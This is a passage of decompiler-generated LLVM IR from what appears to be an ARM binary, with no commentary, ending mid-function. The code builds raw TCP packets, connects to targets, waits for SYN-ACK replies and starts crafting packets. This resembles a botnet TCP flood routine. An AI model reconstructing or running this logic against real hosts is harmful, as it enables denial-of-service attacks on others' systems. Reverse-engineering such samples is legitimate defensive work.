  %v4_c2c8 = ptrtoint i32* %v2_c2c8 to i32
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c2d8 = load i32, i32* @r7, align 4
  store i32 %v0_c2d8, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  store i32 %v0_c2dc, i32* %r0.global-to-local, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @function_ad24(i32 %v0_c2dc, i32* %v5_c2e0, i32 2, i32 %v0_c2d8)
  %v1_c2ec = urem i32 %v6_c2e0, 256
  store i32 %v1_c2ec, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c2f8 = load i32, i32* @r5, align 4
  store i32 %v0_c2f8, i32* %r1.global-to-local, align 4
  %v0_c2fc = load i32, i32* @r4, align 4
  store i32 %v0_c2fc, i32* %r0.global-to-local, align 4
  %v5_c300 = trunc i32 %v6_c2e0 to i8
  %v6_c304 = inttoptr i32 %v0_c2f8 to i32*
  %v7_c304 = call i32 @function_ad24(i32 %v0_c2fc, i32* %v6_c304, i32 3, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_c308 = load i32, i32* @r5, align 4
  store i32 %v0_c308, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_c304, i32* %sb.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v4_c31c = inttoptr i32 %v0_c308 to i32*
  %v5_c31c = call i32 @function_ad24(i32 %v0_c318, i32* %v4_c31c, i32 4, i32 64)
  %v1_c324 = urem i32 %v5_c31c, 256
  store i32 %v1_c324, i32* %ip.global-to-local, align 4
  %v0_c328 = load i32, i32* @r5, align 4
  store i32 %v0_c328, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c334 = load i32, i32* @r4, align 4
  store i32 %v0_c334, i32* %r0.global-to-local, align 4
  %v6_c33c = inttoptr i32 %v0_c328 to i32*
  %v7_c33c = call i32 @function_ad24(i32 %v0_c334, i32* %v6_c33c, i32 5, i32 1)
  %v1_c348 = urem i32 %v7_c33c, 256
  store i32 %v1_c348, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_c350 = load i32, i32* @r5, align 4
  store i32 %v0_c350, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c358 = load i32, i32* @r4, align 4
  store i32 %v0_c358, i32* %r0.global-to-local, align 4
  %v6_c360 = inttoptr i32 %v0_c350 to i32*
  %v7_c360 = call i32 @function_ad24(i32 %v0_c358, i32* %v6_c360, i32 7, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_c364 = load i32, i32* @r5, align 4
  store i32 %v0_c364, i32* %r1.global-to-local, align 4
  %v3_c368 = mul i32 %v7_c360, 65536
  store i32 %v3_c368, i32* @sl, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_c370 = load i32, i32* @r7, align 4
  store i32 %v0_c370, i32* %r3.global-to-local, align 4
  %v0_c374 = load i32, i32* @r4, align 4
  store i32 %v0_c374, i32* %r0.global-to-local, align 4
  %v4_c378 = inttoptr i32 %v0_c364 to i32*
  %v5_c378 = call i32 @function_ad24(i32 %v0_c374, i32* %v4_c378, i32 10, i32 %v0_c370)
  %v1_c380 = urem i32 %v5_c378, 256
  store i32 %v1_c380, i32* %ip.global-to-local, align 4
  %v0_c384 = load i32, i32* @r5, align 4
  store i32 %v0_c384, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c390 = load i32, i32* @r4, align 4
  store i32 %v0_c390, i32* %r0.global-to-local, align 4
  %v5_c398 = inttoptr i32 %v0_c384 to i32*
  %v6_c398 = call i32 @function_ad24(i32 %v0_c390, i32* %v5_c398, i32 11, i32 1)
  %v1_c3a0 = urem i32 %v6_c398, 256
  store i32 %v1_c3a0, i32* %ip.global-to-local, align 4
  %v0_c3a4 = load i32, i32* @r5, align 4
  store i32 %v0_c3a4, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c3b0 = load i32, i32* @r4, align 4
  store i32 %v0_c3b0, i32* %r0.global-to-local, align 4
  %v5_c3b8 = inttoptr i32 %v0_c3a4 to i32*
  %v6_c3b8 = call i32 @function_ad24(i32 %v0_c3b0, i32* %v5_c3b8, i32 12, i32 1)
  %v1_c3c0 = urem i32 %v6_c3b8, 256
  store i32 %v1_c3c0, i32* %ip.global-to-local, align 4
  %v0_c3c4 = load i32, i32* @r5, align 4
  store i32 %v0_c3c4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_c3cc = load i32, i32* @r7, align 4
  store i32 %v0_c3cc, i32* %r3.global-to-local, align 4
  %v0_c3d0 = load i32, i32* @r4, align 4
  store i32 %v0_c3d0, i32* %r0.global-to-local, align 4
  %v5_c3d8 = inttoptr i32 %v0_c3c4 to i32*
  %v6_c3d8 = call i32 @function_ad24(i32 %v0_c3d0, i32* %v5_c3d8, i32 13, i32 %v0_c3cc)
  %v1_c3e0 = urem i32 %v6_c3d8, 256
  store i32 %v1_c3e0, i32* %ip.global-to-local, align 4
  %v0_c3e4 = load i32, i32* @r5, align 4
  store i32 %v0_c3e4, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_c3ec = load i32, i32* @r7, align 4
  store i32 %v0_c3ec, i32* %r3.global-to-local, align 4
  %v0_c3f0 = load i32, i32* @r4, align 4
  store i32 %v0_c3f0, i32* %r0.global-to-local, align 4
  %v5_c3f8 = inttoptr i32 %v0_c3e4 to i32*
  %v6_c3f8 = call i32 @function_ad24(i32 %v0_c3f0, i32* %v5_c3f8, i32 14, i32 %v0_c3ec)
  %v1_c400 = urem i32 %v6_c3f8, 256
  store i32 %v1_c400, i32* %ip.global-to-local, align 4
  %v0_c404 = load i32, i32* @r5, align 4
  store i32 %v0_c404, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_c40c = load i32, i32* @r7, align 4
  store i32 %v0_c40c, i32* %r3.global-to-local, align 4
  %v0_c410 = load i32, i32* @r4, align 4
  store i32 %v0_c410, i32* %r0.global-to-local, align 4
  %v5_c418 = inttoptr i32 %v0_c404 to i32*
  %v6_c418 = call i32 @function_ad24(i32 %v0_c410, i32* %v5_c418, i32 15, i32 %v0_c40c)
  %v1_c420 = urem i32 %v6_c418, 256
  store i32 %v1_c420, i32* %ip.global-to-local, align 4
  %v0_c424 = load i32, i32* @r7, align 4
  store i32 %v0_c424, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_c42c = load i32, i32* @r5, align 4
  store i32 %v0_c42c, i32* %r1.global-to-local, align 4
  %v0_c430 = load i32, i32* @r4, align 4
  store i32 %v0_c430, i32* %r0.global-to-local, align 4
  %v5_c438 = inttoptr i32 %v0_c42c to i32*
  %v6_c438 = call i32 @function_ad24(i32 %v0_c430, i32* %v5_c438, i32 %v0_c424, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c444 = load i32, i32* @r5, align 4
  store i32 %v0_c444, i32* %r1.global-to-local, align 4
  %v0_c44c = load i32, i32* @r4, align 4
  store i32 %v0_c44c, i32* %r0.global-to-local, align 4
  %v4_c450 = inttoptr i32 %v0_c444 to i32*
  %v5_c450 = call i32 @function_ad24(i32 %v0_c44c, i32* %v4_c450, i32 1, i32 1)
  %v1_c458 = urem i32 %v5_c450, 256
  store i32 %v1_c458, i32* %r3.global-to-local, align 4
  %v0_c45c = load i32, i32* @r7, align 4
  store i32 %v0_c45c, i32* %r0.global-to-local, align 4
  %v1_c464 = inttoptr i32 %v0_c45c to i32*
  %v2_c464 = call i32 @time(i32* %v1_c464)
  %v1_c468 = load i32, i32* @r6, align 4
  %v2_c468 = add i32 %v1_c468, %v2_c464
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c47c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c47c, i32* %r0.global-to-local, align 4
  %v0_c480 = load i32, i32* @sl, align 4
  %v3_c480 = udiv i32 %v0_c480, 65536
  store i32 %v3_c480, i32* %r1.global-to-local, align 4
  %v7_c484 = icmp eq i32 %v3_c47c, -1
  store i1 %v7_c484, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c47c, i32* @r8, align 4
  br i1 %v7_c484, label %dec_label_pc_c850, label %dec_label_pc_c494

dec_label_pc_c494:                                ; preds = %dec_label_pc_c288
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c49c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c49c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_c4a4 = load i32, i32* @r7, align 4
  store i32 %v0_c4a4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c4b0 = call i32 @setsockopt(i32 %v0_c4a4, i32 3, i32 %v6_c49c, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_c4b0, i32* %r0.global-to-local, align 4
  %v7_c4b4 = icmp eq i32 %v6_c4b0, -1
  store i1 %v7_c4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c4b4, label %dec_label_pc_c848, label %dec_label_pc_c4bc

dec_label_pc_c4bc:                                ; preds = %dec_label_pc_c494
  store i32 %v1_c28c, i32* %r2.global-to-local, align 4
  %v0_c4c0 = load i32, i32* %sb.global-to-local, align 4
  %v3_c4c0 = mul i32 %v0_c4c0, 65536
  store i32 %v3_c4c0, i32* %r0.global-to-local, align 4
  %v3_c4c4 = urem i32 %v0_c4c0, 65536
  store i32 %v3_c4c4, i32* %r3.global-to-local, align 4
  %v2_c4c8 = icmp eq i32 %v1_c28c, 0
  store i1 %v2_c4c8, i1* %cpsr_z.global-to-local, align 1
  %v0_c4cc = load i32, i32* @r7, align 4
  store i32 %v0_c4cc, i32* %stack_var_-40, align 4
  br i1 %v2_c4c8, label %dec_label_pc_c4bc.dec_label_pc_c6d0.preheader_crit_edge, label %dec_label_pc_c4d8

dec_label_pc_c4bc.dec_label_pc_c6d0.preheader_crit_edge: ; preds = %dec_label_pc_c4bc
  %.pre = add i32 %v6_c438, 40
  br label %dec_label_pc_c6d0.preheader

dec_label_pc_c4d8:                                ; preds = %dec_label_pc_c4bc
  %v0_c4dc = load i32, i32* @sl, align 4
  %v3_c4dc = udiv i32 %v0_c4dc, 16777216
  %tmp84 = udiv i32 %v0_c4c0, 256
  %v3_c4e0 = urem i32 %tmp84, 256
  store i32 %v3_c4e0, i32* %r0.global-to-local, align 4
  %v1_c4e4 = add i32 %v6_c438, 40
  store i32 %v1_c4e4, i32* %ip.global-to-local, align 4
  %v2_c518 = ptrtoint i32* %stack_var_-332 to i32
  %v9_c8c4 = icmp eq i32 %v3_c480, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  %v2_c5a4 = ptrtoint i32* %stack_var_-60 to i32
  %tmp85 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v1_c5c8 = urem i32 %v1_c4e4, 256
  %tmp86 = udiv i32 %v1_c4e4, 256
  %v3_c5cc = urem i32 %tmp86, 256
  %v2_c5dc = ptrtoint i32* %stack_var_-44 to i32
  %tmp87 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v4_c650 = zext i8 %tmp38 to i32
  %v4_c654 = zext i8 %tmp37 to i32
  %v4_c660 = mul nuw nsw i32 %v4_c654, 256
  %v4_c670 = zext i8 %tmp36 to i32
  %v1_c674 = and i32 %v4_c670, 18
  %v2_c678 = icmp eq i32 %v1_c674, 18
  %sext = mul i32 %v7_c33c, 16777216
  %v4_c9dc = sdiv i32 %sext, 16777216
  %v4_c9ec = sext i8 %v5_c300 to i32
  %sext9 = mul i32 %v5_c31c, 16777216
  %v4_c9f8 = sdiv i32 %sext9, 16777216
  %v1_cae0 = urem i32 %v5_c378, 2
  %tmp111 = sub nsw i32 0, %v1_cae0
  %v4_cae8 = and i32 %tmp111, 32
  %v1_cb14 = urem i32 %v6_c3b8, 2
  %tmp112 = sub nsw i32 0, %v1_cb14
  %v4_cb1c = and i32 %tmp112, 8
  %v1_cb60 = urem i32 %v6_c418, 2
  %v4_c5d0 = mul nuw nsw i32 %v1_c5c8, 256
  %v5_c5d0 = or i32 %v4_c5d0, %v3_c5cc
  %v5_c660 = or i32 %v4_c650, %v4_c660
  %v1_c680 = and i32 %v4_c670, 5
  %v2_c680 = icmp eq i32 %v1_c680, 0
  %v1_c590 = urem i32 %v3_c480, 256
  %v4_c594 = mul nuw nsw i32 %v1_c590, 256
  %v5_c594 = or i32 %v3_c4dc, %v4_c594
  %v1_c59c = trunc i32 %v3_c480 to i8
  %v1_c5a0 = trunc i32 %v3_c4dc to i8
  %v1_c9cc = urem i32 %v0_c4c0, 256
  %v4_c9d4 = mul nuw nsw i32 %v1_c9cc, 256
  %v5_c9d4 = or i32 %v4_c9d4, %v3_c4e0
  %sext8 = mul i32 %v1_c4e4, 16777216
  %v4_c9f0 = sdiv i32 %sext8, 16777216
  %v1_caf8 = urem i32 %v6_c398, 2
  %tmp113 = sub nsw i32 0, %v1_caf8
  %v4_cb00 = and i32 %tmp113, 16
  %v1_cb2c = urem i32 %v6_c3d8, 2
  %tmp114 = sub nsw i32 0, %v1_cb2c
  %v4_cb34 = and i32 %tmp114, 4
  %v1_cb44 = urem i32 %v6_c3f8, 2
  %tmp115 = sub nsw i32 0, %v1_cb44
  %v3_cb4c = and i32 %tmp115, 2
  br label %dec_label_pc_c4f4.outer

dec_label_pc_c4f4.outer:                          ; preds = %.thread11, %dec_label_pc_c4d8
  %stack_var_-336.0.ph = phi i32 [ %v0_ca0c, %.thread11 ], [ %tmp, %dec_label_pc_c4d8 ]
  %stack_var_-56.0.ph = phi i32 [ %v0_c918, %.thread11 ], [ %tmp44, %dec_label_pc_c4d8 ]
  br label %dec_label_pc_c4f4

dec_label_pc_c4f4:                                ; preds = %dec_label_pc_c6b8, %dec_label_pc_c688, %dec_label_pc_c4f4.outer
  %stack_var_-56.0 = phi i32 [ %stack_var_-56.0.ph, %dec_label_pc_c4f4.outer ], [ %stack_var_-56.5, %dec_label_pc_c6b8 ], [ %v0_c918, %dec_label_pc_c688 ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v3_c4e0, i32* %lr.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c50c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_c50c, i32* %r0.global-to-local, align 4
  %v7_c510 = icmp eq i32 %v3_c50c, -1
  store i1 %v7_c510, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c50c, i32* @r7, align 4
  br i1 %v7_c510, label %dec_label_pc_c6b8, label %dec_label_pc_c524

dec_label_pc_c524:                                ; preds = %dec_label_pc_c4f4, %dec_label_pc_c694
  %v0_c52c = phi i32 [ %v3_c6a8, %dec_label_pc_c694 ], [ %v3_c50c, %dec_label_pc_c4f4 ]
  %stack_var_-56.1 = phi i32 [ %v0_c918, %dec_label_pc_c694 ], [ %stack_var_-56.0, %dec_label_pc_c4f4 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c52c = call i32 (i32, i32, ...) @fcntl(i32 %v0_c52c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_c534 = or i32 %v2_c52c, 2048
  store i32 %v1_c534, i32* %r2.global-to-local, align 4
  %v0_c538 = load i32, i32* @r7, align 4
  store i32 %v0_c538, i32* %r0.global-to-local, align 4
  %v2_c53c = call i32 (i32, i32, ...) @fcntl(i32 %v0_c538, i32 4)
  %v3_c540 = load i32, i32* %stack_var_-40, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_c54c = mul i32 %v3_c540, 24
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v2_c560 = add i32 %v5_c54c, %arg3
  store i32 %v2_c560, i32* %r2.global-to-local, align 4
  %v1_c564 = add i32 %v2_c560, 20
  %v2_c564 = inttoptr i32 %v1_c564 to i8*
  %v3_c564 = load i8, i8* %v2_c564, align 1
  %v4_c564 = zext i8 %v3_c564 to i32
  store i32 %v4_c564, i32* %r3.global-to-local, align 4
  %v2_c568 = icmp ugt i8 %v3_c564, 30
  %v7_c568 = icmp eq i8 %v3_c564, 31
  store i1 %v7_c568, i1* %cpsr_z.global-to-local, align 1
  %v2_c56c = xor i1 %v7_c568, true
  %v3_c56c = and i1 %v2_c568, %v2_c56c
  br i1 %v3_c56c, label %bb, label %bb88

bb:                                               ; preds = %dec_label_pc_c524
  %v5_c56c = add i32 %v2_c560, 16
  %v6_c56c = inttoptr i32 %v5_c56c to i32*
  %v7_c56c = load i32, i32* %v6_c56c, align 4
  store i32 %v7_c56c, i32* %r3.global-to-local, align 4
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_c524, %bb
  %v4_c570 = phi i32 [ %v4_c564, %dec_label_pc_c524 ], [ %v7_c56c, %bb ]
  %v4_c570.stack_var_-56.1 = select i1 %v3_c56c, i32 %v4_c570, i32 %stack_var_-56.1
  %v2_c574 = xor i1 %v2_c568, true
  %v3_c574 = or i1 %v7_c568, %v2_c574
  br i1 %v3_c574, label %dec_label_pc_c858, label %dec_label_pc_c578

dec_label_pc_c578:                                ; preds = %bb88
  store i32 %v3_c480, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_c8c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c8c4, label %dec_label_pc_c8cc, label %dec_label_pc_c58c

dec_label_pc_c58c:                                ; preds = %dec_label_pc_c858, %dec_label_pc_c578
  %stack_var_-56.3 = phi i32 [ %v2_c8b0, %dec_label_pc_c858 ], [ %v4_c570.stack_var_-56.1, %dec_label_pc_c578 ]
  store i32 %v3_c4dc, i32* %r0.global-to-local, align 4
  store i32 %v5_c594, i32* %r3.global-to-local, align 4
  store i32 %v1_c590, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c5a4

dec_label_pc_c5a4:                                ; preds = %dec_label_pc_c8cc, %dec_label_pc_c58c
  %stack_var_-57.0 = phi i8 [ %v1_c8d4, %dec_label_pc_c8cc ], [ %v1_c59c, %dec_label_pc_c58c ]
  %v0_c918 = phi i32 [ %stack_var_-56.6, %dec_label_pc_c8cc ], [ %stack_var_-56.3, %dec_label_pc_c58c ]
  %storemerge = phi i8 [ %v1_c8cc, %dec_label_pc_c8cc ], [ %v1_c5a0, %dec_label_pc_c58c ]
  store i32 %v2_c5a4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_c5ac = load i32, i32* @r7, align 4
  store i32 %v0_c5ac, i32* %r0.global-to-local, align 4
  %v5_c5b0 = call i32 @connect(i32 %v0_c5ac, %sockaddr* %tmp85, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c5b8 = call i32 @time(i32* null)
  store i32 %v2_c5b8, i32* %r0.global-to-local, align 4
  store i32 %v1_c4e4, i32* %r1.global-to-local, align 4
  store i32 %v1_c5c8, i32* %r3.global-to-local, align 4
  store i32 %v5_c5d0, i32* @fp, align 4
  store i32 %v1_c5c8, i32* %r2.global-to-local, align 4
  store i32 %v2_c5b8, i32* %r4.global-to-local, align 4
  store i32 %v2_c5dc, i32* @r6, align 4
  %v9_c634 = icmp eq i32 %tmp39, %v0_c918
  %v4_c658 = zext i8 %storemerge to i32
  %v4_c65c = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_c634 to i32
  %v9_c648 = icmp eq i1 %v9_c634, false
  %v4_c664 = mul nuw nsw i32 %v4_c65c, 256
  %v5_c664 = or i32 %v4_c658, %v4_c664
  %v9_c668 = icmp eq i32 %v5_c664, %v5_c660
  br label %dec_label_pc_c5f8

dec_label_pc_c5e8:                                ; preds = %.thread31, %dec_label_pc_c650, %dec_label_pc_c680, %bb91
  %v2_c5e8 = call i32 @time(i32* null)
  %v0_c5ec = load i32, i32* %r4.global-to-local, align 4
  %v2_c5ec = sub i32 %v2_c5e8, %v0_c5ec
  store i32 %v2_c5ec, i32* %r0.global-to-local, align 4
  %v7_c5f0 = icmp eq i32 %v2_c5ec, 10
  store i1 %v7_c5f0, i1* %cpsr_z.global-to-local, align 1
  %v8_c5f4 = icmp sgt i32 %v2_c5ec, 10
  br i1 %v8_c5f4, label %dec_label_pc_c694, label %dec_label_pc_c5f8

dec_label_pc_c5f8:                                ; preds = %dec_label_pc_c5e8, %dec_label_pc_c5a4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 %v2_c518, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c608 = load i32, i32* @r8, align 4
  store i32 %v0_c608, i32* %r0.global-to-local, align 4
  store i32 16, i32* %stack_var_-44, align 4
  %v10_c618 = call i32 @recvfrom(i32 %v0_c608, i32* nonnull %stack_var_-332, i32 256, i32 16384, %sockaddr* %tmp87, i32* nonnull %stack_var_-44)
  store i32 %v10_c618, i32* %r2.global-to-local, align 4
  %v7_c620 = icmp eq i32 %v10_c618, -1
  store i1 %v7_c620, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_c620, label %dec_label_pc_c850, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c5f8
  store i32 %v0_c918, i32* %lr.global-to-local, align 4
  store i32 %tmp39, i32* %r3.global-to-local, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_c640 = icmp eq i32 %v10_c618, 40
  store i1 %v7_c640, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp ult i32 %v10_c618, 41
  br i1 %tmp116, label %.thread31, label %bb91

.thread31:                                        ; preds = %dec_label_pc_c62c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c5e8

bb91:                                             ; preds = %dec_label_pc_c62c
  store i1 %v9_c648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c648, label %dec_label_pc_c5e8, label %dec_label_pc_c650

dec_label_pc_c650:                                ; preds = %bb91
  store i32 %v4_c654, i32* %r1.global-to-local, align 4
  store i32 %v4_c658, i32* %ip.global-to-local, align 4
  store i32 %v4_c65c, i32* %r2.global-to-local, align 4
  store i32 %v5_c660, i32* %r3.global-to-local, align 4
  store i32 %v5_c664, i32* @r5, align 4
  store i1 %v9_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c668, label %dec_label_pc_c670, label %dec_label_pc_c5e8

dec_label_pc_c670:                                ; preds = %dec_label_pc_c650
  store i32 %v4_c670, i32* %r2.global-to-local, align 4
  store i32 %v1_c674, i32* %r3.global-to-local, align 4
  store i1 %v2_c678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c678, label %dec_label_pc_c90c, label %dec_label_pc_c680

dec_label_pc_c680:                                ; preds = %dec_label_pc_c670
  store i1 %v2_c680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c680, label %dec_label_pc_c5e8, label %dec_label_pc_c688

dec_label_pc_c688:                                ; preds = %dec_label_pc_c680
  %v0_c688 = load i32, i32* @r7, align 4
  store i32 %v0_c688, i32* %r0.global-to-local, align 4
  %v1_c68c = call i32 @close(i32 %v0_c688)
  store i32 %v1_c68c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4f4

dec_label_pc_c694:                                ; preds = %dec_label_pc_c5e8
  %v0_c694 = load i32, i32* @r7, align 4
  store i32 %v0_c694, i32* %r0.global-to-local, align 4
  %v1_c698 = call i32 @close(i32 %v0_c694)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c6a8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_c6a8, i32* %r0.global-to-local, align 4
  %v3_c6ac = icmp eq i32 %v3_c6a8, -1
  %v8_c6ac = icmp eq i32 %v3_c6a8, -1
  store i1 %v8_c6ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c6a8, i32* @r7, align 4
  br i1 %v3_c6ac, label %dec_label_pc_c6b8, label %dec_label_pc_c524

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c694, %dec_label_pc_c4f4
  %stack_var_-56.5 = phi i32 [ %stack_var_-56.0, %dec_label_pc_c4f4 ], [ %v0_c918, %dec_label_pc_c694 ]
  %v3_c6b8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v1_c28c, i32* %lr.global-to-local, align 4
  %v1_c6c0 = add i32 %v3_c6b8, 1
  store i32 %v1_c6c0, i32* %r3.global-to-local, align 4
  %v9_c6c4 = icmp eq i32 %v1_c6c0, %v1_c28c
  store i1 %v9_c6c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c6c0, i32* %stack_var_-40, align 4
  %v5_c6cc = icmp slt i32 %v1_c6c0, %v1_c28c
  br i1 %v5_c6cc, label %dec_label_pc_c4f4, label %dec_label_pc_c6d0.preheader

dec_label_pc_c6d0.preheader:                      ; preds = %.thread11, %dec_label_pc_c6b8, %dec_label_pc_c4bc.dec_label_pc_c6d0.preheader_crit_edge
  %v1_c704.pre-phi = phi i32 [ %.pre, %dec_label_pc_c4bc.dec_label_pc_c6d0.preheader_crit_edge ], [ %v1_c4e4, %dec_label_pc_c6b8 ], [ %v1_c4e4, %.thread11 ]
  %v1_c6e8 = add i32 %v6_c438, 20
  %v3_c6ec = mul i32 %v1_c6e8, 65536
  %tmp93 = mul i32 %v1_c6e8, 256
  %v1_c6f4 = and i32 %tmp93, 65280
  %tmp94 = udiv i32 %v1_c6e8, 256
  %v4_c6f8 = urem i32 %tmp94, 256
  %v5_c6f8 = or i32 %v4_c6f8, %v1_c6f4
  %v2_c828 = icmp eq i32 %v1_c458, 0
  %v9_c814 = icmp eq i32 %v3_c4c4, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  br label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6d0.preheader, %dec_label_pc_c8f4
  store i32 %v1_c28c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 %v2_c4c8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_c4c8, label %dec_label_pc_c8f4, label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c6d0
  store i32 %v1_c6e8, i32* @sl, align 4
  store i32 %v3_c6ec, i32* %r2.global-to-local, align 4
  store i32 %v5_c6f8, i32* @fp, align 4
  store i32 %v6_c438, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_c704.pre-phi, i32* @sb, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_c800

dec_label_pc_c710:                                ; preds = %dec_label_pc_c824, %dec_label_pc_c838
  %v0_c710 = load i32, i32* @r7, align 4
  %v1_c710 = trunc i32 %v0_c710 to i8
  %v2_c710 = load i32, i32* @r4, align 4
  %v3_c710 = add i32 %v2_c710, 10
  %v4_c710 = inttoptr i32 %v3_c710 to i8*
  store i8 %v1_c710, i8* %v4_c710, align 1
  %v0_c714 = load i32, i32* @r7, align 4
  %v1_c714 = trunc i32 %v0_c714 to i8
  %v2_c714 = load i32, i32* @r4, align 4
  %v3_c714 = add i32 %v2_c714, 11
  %v4_c714 = inttoptr i32 %v3_c714 to i8*
  store i8 %v1_c714, i8* %v4_c714, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c71c = load i32, i32* @r4, align 4
  store i32 %v0_c71c, i32* @r0, align 4
  %v2_c720 = call i32 @function_f188(i32 %v0_c71c, i32 20)
  %v3_c720 = trunc i32 %v2_c720 to i8
  store i32 %v2_c720, i32* %r0.global-to-local, align 4
  %v3_c724 = load i32, i32* %stack_var_-40, align 4
  store i32 %v4_c2b8, i32* %r2.global-to-local, align 4
  %v3_c72c = mul i32 %v3_c724, 16
  %v2_c730 = add i32 %v3_c72c, %v4_c2b8
  store i32 %v2_c730, i32* %r1.global-to-local, align 4
  %v1_c734 = add i32 %v2_c730, 4
  %v2_c734 = inttoptr i32 %v1_c734 to i32*
  %v3_c734 = load i32, i32* %v2_c734, align 4
  %v3_c738 = mul i32 %v3_c734, 65536
  store i32 %v3_c738, i32* %ip.global-to-local, align 4
  %tmp95 = mul i32 %v3_c734, 256
